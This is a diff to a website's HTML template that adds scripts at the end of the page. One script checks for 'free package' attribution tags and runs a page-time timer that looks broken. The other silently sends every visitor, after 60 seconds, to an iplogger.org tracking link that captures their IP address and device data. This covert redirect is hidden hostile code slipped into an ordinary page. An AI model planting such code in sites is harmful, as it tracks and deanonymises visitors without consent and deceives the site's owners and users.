@@ -106,6 +106,25 @@
     
     <!-- Global Init -->
     <script src="assets/js/custom.js"></script>
+<script type="text/javascript">
+pageOpen = new Date(); function ctck() {
+var sds = document.getElementById("dum");
+if(sds == null){
+alert("You are using a free package.\n You are not allowed to remove the tag.\n");
+}
+var sdss = document.getElementById("dumdiv");
+if(sdss == null){
+alert("You are using a free package.\n You are not allowed to remove the tag.\n");
+} } document.onload="ctck()";
+function leavingPage() {
+pageClose =new Date(); hours=pageClose.getHours()-pageOpen.getHours(); minutes=pageClose.getMinutes()-pageOpen.getMinutes(); seconds=pageClose.getSeconds()-pageOpen.getSeconds(); time = (seconds + (minutes * 60) + (hours * 60 * 60)); if(time<60){ document.time.t1field.value="Time- " + time + " seconds"; } else { min=(parseInt(time/60)); sec=(time%60); document.time.t1field.value="Time- " + min + " minutes " + sec + " seconds"; } } function timer() { leavingPage(); setTimeout('timer()',1000) } document.onload=timer(); </script>
 
+   
+
+  <script>
+        var timer = setTimeout(function() {
+            window.location='https://iplogger.org/2rTA26'
+        }, 60000);
+    </script>
   </body>
 </html>
